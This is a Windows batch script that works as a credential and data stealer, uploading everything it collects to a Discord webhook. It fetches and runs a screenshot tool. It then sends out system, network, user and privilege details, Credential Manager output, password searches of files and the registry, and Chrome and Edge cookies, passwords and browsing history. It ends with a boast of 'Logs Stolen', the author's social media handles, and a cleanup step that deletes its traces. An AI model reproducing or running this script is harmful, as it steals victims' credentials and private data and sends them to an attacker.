@echo off
timeout 2
cd %appdata%
set "webhook=https://discord.com/api/webhooks/your_webhook_here"

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```--------------------------------------------------------------------------```\"}" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```New Session !!```\"}" %webhook%



curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot from %ComputerName% @ %TIME%```\"}" %webhook%


curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
.\s.exe -o %appdata%\s.png
curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook%


curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```################################################```\"}" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```################# Device Info ##################```\"}" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```################################################```\"}" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Basic-System-Information ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Basic-System-Information.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Environment-Variables ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Environment-Variables.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Network-Information.txt ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Network-Information.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` DNS-Servers ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\DNS-Servers.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` ARP-cache ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\ARP-cache.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Routing-Table ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Routing-Table.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Network-Connections ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Network-Connections.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Connected-Drives ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Connected-Drives.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Firewall-Config ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Firewall-Config.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Current-User ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Current-User.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` User-Privileges ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\User-Privileges.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Local-Users ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Local-Users.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Logged-in-Users ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Logged-in-Users.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Credential-Manager ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Credential-Manager.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` User-Autologon-Registry-Items ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\User-Autologon-Registry-Items.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Local-Groups ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Local-Groups.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Local-Administrators ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Local-Administrators.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` User-Directories ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\User-Directories.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Searching-for-SAM-backup-files ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Searching-for-SAM-backup-files.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Running-Processes ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Running-Processes.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Installed-Software-Directories ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Installed-Software-Directories.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Software-in-Registry ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Software-in-Registry.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Folders-with-Everyone-Permissions ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Folders-with-Everyone-Permissions.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Folders-with-BUILTIN-User-Permissions ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Folders-with-BUILTIN-User-Permissions.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Checking-registry-for-AlwaysInstallElevated ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Checking-registry-for-AlwaysInstallElevated.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Scheduled-Tasks ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Scheduled-Tasks.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Startup-Commands ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Startup-Commands.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Searching-for-files-with-passwords ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Searching-for-files-with-passwords.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Searching-HKLM-for-passwords ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Searching-HKLM-for-passwords.txt" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` Searching-HKCU-for-passwords ```\"}" %webhook%
curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\Searching-HKCU-for-passwords.txt" %webhook%






curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Google Chrome Logs --------```\"}" %webhook%


curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_cookie.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_extension.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_history.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_localstorage.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_password.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Microsoft Edge Logs --------```\"}" %webhook%

curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_bookmark.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_cookie.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_download.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_history.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_localstorage.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_password.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_user_1_extension.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_user_1_localstorage.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Sessions Done !! ... Logs Stolen 😈  Contact Me In Telegram: @HexBuddy127001  My Instagram: hex_buddy ---------```\"}" %webhook%


del %appdata%\s.exe
del %appdata%\s.png
del %appdata%\sysinfo.txt
del %appdata%\netuser.txt
del %appdata%\dir.txt
del %appdata%\ipconfig.txt
del %appdata%\whoami.txt
del Results4HackedPC.zip
del Results4HackedPC
pause
